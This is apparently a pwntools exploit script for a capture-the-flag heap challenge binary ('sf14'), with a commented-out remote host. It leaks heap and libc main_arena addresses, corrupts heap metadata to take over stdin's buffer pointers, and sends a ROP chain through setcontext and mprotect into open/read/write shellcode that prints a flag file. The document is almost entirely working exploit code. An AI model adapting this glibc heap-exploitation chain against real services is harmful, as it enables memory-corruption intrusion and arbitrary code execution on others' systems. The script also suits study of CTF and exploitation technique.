from pwn import*
p=process('./sf14')
context(arch='amd64',os='linux')
pie_base=''
#p=remote('35.194.245.237',8094)
ELF('./sf14')
#context.log_level = 'debug' 

def printPIE() :
   global pie_base
   pie_base = p.libs()["/home/osori/Desktop/sf14/sf14"]
   print('PIE Base :'+hex(pie_base))

def add(name) :
   p.recvuntil('>> ')
   p.sendline('1')
   p.recvuntil('color name : ')
   p.send(name)

def mix(name, id, count, l) :
   p.recvuntil('>> ')
   p.sendline('2')
   p.recvuntil('name : ')
   p.send(name)
   p.recvuntil('id')
   p.sendline(str(id))
   

   for i in range(count) :
      p.recvuntil('add more color? [y/n] : ')
      p.sendline('y')
      p.recvuntil('>> ')
      p.sendline(str(l[i]))
   if count != 7 :
      p.recvuntil('add more color? [y/n] : ')
      p.sendline('n')

def getheap(name, id, count, l) :
   p.recvuntil('>> ')
   p.sendline('2')
   p.recvuntil('name : ')
   p.send(name)
   p.recvuntil('id')
   p.sendline(str(id))
   

   for i in range(count) :
      p.recvuntil('add more color? [y/n] : ')
      p.sendline('y')
      p.recvuntil('[3] AAAAAAAAAAAAAAAA')
      heap=u64(p.recv(6).ljust(8,'\x00'))
      p.sendline(str(l[i]))
   if count != 7 :
      p.recvuntil('add more color? [y/n] : ')
      p.sendline('n')
   return heap

def get_mainarena(name,id,count,l) :
   p.recvuntil('>> ')
   p.sendline('2')
   p.recvuntil('name : ')
   p.send(name)
   p.recvuntil('id')
   p.sendline(str(id))
   

   for i in range(count) :
      p.recvuntil('add more color? [y/n] : ')
      p.sendline('y')
      p.recvuntil('[2] ')
      heap=u64(p.recv(6).ljust(8,'\x00'))
      p.sendline(str(l[i]))
   if count != 7 :
      p.recvuntil('add more color? [y/n] : ')
      p.sendline('n')
   return heap


def delete(id) :
   p.recvuntil('>> ')
   p.sendline('3')
   p.recvuntil('mixed color id : ')
   p.sendline(str(id))

#0a0


#printPIE()

delete(2)
delete(1)
add('A'*0x10)
heap=getheap('\n',1,7,[0,0,0,0,0,0,2])-0x10
print('heap start : '+hex(heap))

delete(0)
delete(1)

main_arena=get_mainarena('\n',7,6,[0,0,0,0,0,0])-88-0x10
base=main_arena-0x10-0x3c4b10
stdin=base+0x3c48e0
setcontext=base+0x47b50
pop_rdi_ret=base+0x00141c48
pop_rsi_ret=base+0x00142341
pop_rdx_ret=base+0x00001b9e
print('setcontext : '+hex(setcontext))
print('main arena : '+hex(main_arena))
print('stdin : '+hex(stdin))

delete(7)
mix(p64(heap+0x50)[:7],7,6,[0,0,0,0,0,0])

delete(main_arena+104)

add(p64(main_arena+108)+p64(heap+0x110))

delete(7)
mix(p64(heap+0x120)[:7],7,6,[0,0,0,0,0,0])
#add('aa')
#delete(heap+0x1a0)

mix(p64(heap+0x40)[:7],heap+0x1a0,4,[0,0,0,0])
mix(p64(heap+0x110)[:7],0x50,4,[0,0,0,0])
add('aa')
delete(heap+0x1a0)
io_buf_end=stdin+0x40
mprotect=base+0x101830
add(p64(main_arena+88)+p64(io_buf_end-0x10))
mix('a',8,0,[])

pl='a'*5+p64(stdin+0x1eb0)
pl+='\xff'*8  #0x90 
pl+=p64(0) #stdin +0x98
pl+=p64(stdin+0x1a0) # stdin+0xa0
pl+=p64(pop_rdi_ret)
pl+=p64(0)*2+p64(0xffffffff)+p64(0)*2+p64(stdin+0xf0)
pl+=p64(stdin+0x1a0)+p64(stdin+0x1a0) #rsp->main_arena
pl+=p64(0x0)*2+p64(setcontext+53)*20

pl+=p64(main_arena-0xb20)
pl+=p64(pop_rsi_ret)+p64(0x2000)
pl+=p64(pop_rdx_ret)+p64(7)
pl+=p64(mprotect)
pl+=p64(stdin+0x1d8)
shell=asm('mov rax,2')
shell+=asm('mov r13,rsp')
shell+=asm('mov r13,'+hex(main_arena))
shell+=asm('mov rdi,r13')
shell+=asm('mov rsi,0')
shell+=asm('mov rdx,0')
shell+=asm('syscall')
shell+=asm('mov rdi,rax')
shell+=asm('mov rax,0')
shell+=asm('mov rsi,r13')
shell+=asm('add rsi,0x100')
shell+=asm('mov rdx,100')
shell+=asm('syscall')
shell+=asm('mov rdi,1')
shell+=asm('mov rsi,r13')
shell+=asm('add rsi,0x100')
shell+=asm('mov rdx,100')
shell+=asm('mov rax,1')
shell+=asm('syscall')
shell+='\x90'*3

shell+='/home/osori/jam/flag\x00'
p.sendline(pl+shell)
'''
p.interactive()

